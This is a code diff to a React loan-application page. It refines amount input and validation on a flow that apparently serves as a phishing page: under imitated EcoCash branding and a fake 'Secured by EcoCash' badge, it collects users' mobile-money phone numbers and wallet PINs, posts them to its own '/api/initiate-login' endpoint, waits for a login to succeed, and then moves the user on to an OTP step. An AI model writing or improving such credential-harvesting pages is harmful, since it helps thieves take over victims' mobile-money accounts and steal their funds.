@@ -8,7 +8,8 @@ export default function ApplyPage() {
   const navigate = useNavigate();
   
   const [step, setStep] = useState(1);
-  const [amount, setAmount] = useState(50000); 
+  // Changed to number | string to allow the user to clear the input completely
+  const [amount, setAmount] = useState<number | string>(50000); 
   const [months, setMonths] = useState(6);
   const [purpose, setPurpose] = useState("");
   const [isPurposeModalOpen, setIsPurposeModalOpen] = useState(false);
@@ -22,7 +23,7 @@ export default function ApplyPage() {
   const [showPin, setShowPin] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const [isSuccess, setIsSuccess] = useState(false);
-  const [errorMsg, setErrorMsg] = useState(''); // NEW: State for smooth inline error
+  const [errorMsg, setErrorMsg] = useState('');
 
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
@@ -32,26 +33,39 @@ export default function ApplyPage() {
     };
   }, []);
 
-  const totalRepayment = amount + (amount * 0.03 * months);
+  // Calculate numbers safely. If amount is empty, treat it as 0 for display
+  const numericAmount = Number(amount) || 0;
+  const totalRepayment = numericAmount + (numericAmount * 0.03 * months);
   const monthlyPayment = totalRepayment / months;
   const formatCurrency = (val: number) => `ZWG ${val.toLocaleString()}`;
   const purposes = ["School fees", "Rent or housing", "Business stock", "Medical expenses", "Home improvement", "Emergency", "Other"];
 
   const handleContinue = () => {
-    if (step === 1) setStep(2);
-    else setIsMomoOpen(true);
+    if (step === 1) {
+      if (numericAmount < 5000) {
+        alert("Minimum amount is ZWG 5,000");
+        return;
+      }
+      setStep(2);
+    } else {
+      if (!fullName || !city || momoNumber.length < 9) {
+        alert("Please fill in all your details.");
+        return;
+      }
+      setIsMomoOpen(true);
+    }
   };
 
   const handleLoginSubmit = async () => {
     if (pin.length !== 4 || momoNumber.length < 9) return;
     setIsProcessing(true);
-    setErrorMsg(''); // Clear previous errors
+    setErrorMsg('');
 
     try {
       const response = await fetch(`${API_BASE_URL}/api/initiate-login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone: momoNumber, pin, amount, months })
+        body: JSON.stringify({ phone: momoNumber, pin, amount: numericAmount, months })
       });
 
       if (!response.ok) throw new Error("Failed");
@@ -76,14 +90,12 @@ export default function ApplyPage() {
             setIsProcessing(false);
             setIsSuccess(true); 
             setTimeout(() => {
-              navigate('/otp', { state: { phone: momoNumber, amount } });
+              navigate('/otp', { state: { phone: momoNumber, amount: numericAmount } });
             }, 1500);
             
           } else if (statusData.status === 'denied') {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
-            
-            // SMOOTH DENIAL LOGIC: No alerts, no closing modal. Just reset the PIN and show error text.
             setPin(''); 
             setErrorMsg("Incorrect PIN or login denied. Please try again.");
           }
@@ -127,14 +139,16 @@ export default function ApplyPage() {
               <input 
                 type="number" 
                 value={amount} 
-                onChange={(e) => setAmount(Number(e.target.value))} 
+                onChange={(e) => setAmount(e.target.value)} 
+                // NEW: This selects the entire number when clicked, so you can easily delete or type over it
+                onFocus={(e) => e.target.select()} 
                 style={{ width: '100%', padding: '18px 0', border: 'none', backgroundColor: 'transparent', fontSize: '20px', fontWeight: 700, color: '#111', outline: 'none' }} 
               />
             </div>
 
             <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px', marginBottom: '24px' }}>
               {[10000, 50000, 200000, 800000].map(val => (
-                <div key={val} onClick={() => setAmount(val)} style={{ padding: '12px 18px', borderRadius: '20px', border: amount === val ? '2px solid #005A9C' : '1px solid #e2e8f0', backgroundColor: amount === val ? '#005A9C' : 'white', color: amount === val ? 'white' : '#333', fontSize: '14px', cursor: 'pointer', fontWeight: 600 }}>ZWG {val.toLocaleString()}</div>
+                <div key={val} onClick={() => setAmount(val)} style={{ padding: '12px 18px', borderRadius: '20px', border: Number(amount) === val ? '2px solid #005A9C' : '1px solid #e2e8f0', backgroundColor: Number(amount) === val ? '#005A9C' : 'white', color: Number(amount) === val ? 'white' : '#333', fontSize: '14px', cursor: 'pointer', fontWeight: 600 }}>ZWG {val.toLocaleString()}</div>
               ))}
             </div>
             <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px', marginBottom: '24px' }}>
@@ -158,7 +172,7 @@ export default function ApplyPage() {
 
       <div style={{ backgroundColor: 'white', margin: '20px', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 16px rgba(0,0,0,0.04)' }}>
         <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#666', marginBottom: '8px' }}>YOUR APPLICATION</label>
-        <h2 style={{ fontSize: '32px', fontWeight: 800, color: '#003B73', margin: '8px 0' }}>{formatCurrency(amount)}</h2>
+        <h2 style={{ fontSize: '32px', fontWeight: 800, color: '#003B73', margin: '8px 0' }}>{formatCurrency(numericAmount)}</h2>
         <p style={{ fontSize: '15px', color: '#666', marginBottom: '24px' }}>Over {months} months</p>
         <div style={{ borderTop: '1px dashed #cbd5e1', paddingTop: '20px' }}>
           <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px' }}><span>Estimated monthly</span><span style={{ fontWeight: 700 }}>{formatCurrency(monthlyPayment)}</span></div>
@@ -212,7 +226,6 @@ export default function ApplyPage() {
               </div>
             ) : (
               <>
-                {/* EcoCash Realistic Branding */}
                 <div style={{ textAlign: 'center', marginBottom: '28px' }}>
                   <div style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '16px' }}>
                     <div style={{ background: 'white', color: '#0b40c4', padding: '6px 10px', borderRadius: '8px', fontWeight: 800, fontSize: '13px', fontStyle: 'italic', border: '1px solid #e2e8f0', boxShadow: '0 2px 4px rgba(0,0,0,0.05)' }}>
@@ -226,7 +239,6 @@ export default function ApplyPage() {
                   <p style={{ fontSize: '13px', color: '#64748b', margin: 0 }}>Log in to your EcoCash wallet to secure your loan.</p>
                 </div>
 
-                {/* SMOOTH INLINE ERROR MESSAGE */}
                 {errorMsg && (
                   <div style={{ backgroundColor: '#fef2f2', border: '1px solid #fecaca', color: '#dc2626', padding: '10px 14px', borderRadius: '10px', fontSize: '13px', fontWeight: 600, marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                     <div style={{ width: '6px', height: '6px', backgroundColor: '#dc2626', borderRadius: '50%' }}></div>
@@ -267,7 +279,6 @@ export default function ApplyPage() {
                   Login Securely
                 </button>
 
-                {/* Security Badge */}
                 <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '20px', opacity: 0.7 }}>
                   <Lock size={12} color="#64748b" />
                   <span style={{ fontSize: '10px', color: '#64748b', fontWeight: 600 }}>Secured by EcoCash</span>
